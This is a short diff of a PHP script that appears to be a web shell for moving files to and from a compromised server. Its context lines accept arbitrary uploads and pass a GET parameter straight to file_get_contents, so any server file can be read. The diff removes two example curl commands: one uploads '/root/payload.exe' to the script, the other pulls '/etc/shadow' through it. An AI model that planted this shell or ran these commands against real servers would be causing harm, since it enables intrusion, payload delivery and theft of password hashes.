@@ -17,8 +17,6 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
         $output = "SUCCESS: File was uploaded to '{$output}'";
     }
     unset($_FILES[$parameter]);
-    // you can use cURL to upload local files
-    // curl -s -k -X 'POST' 'https://somedomain.com/files.php' -F 'file=@/root/payload.exe'
 }
 if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'get' && isset($_GET[$parameter]) && ($_GET[$parameter] = trim($_GET[$parameter])) && strlen($_GET[$parameter]) > 0) {
     $output = @file_get_contents($_GET[$parameter]);
@@ -31,8 +29,6 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
         $output = 'download';
     }
     unset($_GET[$parameter]);
-    // you can use cURL to download remote files
-    // curl -s -k -X 'GET' 'https://somedomain.com/files.php?file=/etc/shadow' -O ./
 }
 // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
 // garbage collector requires PHP v5.3.0 or greater
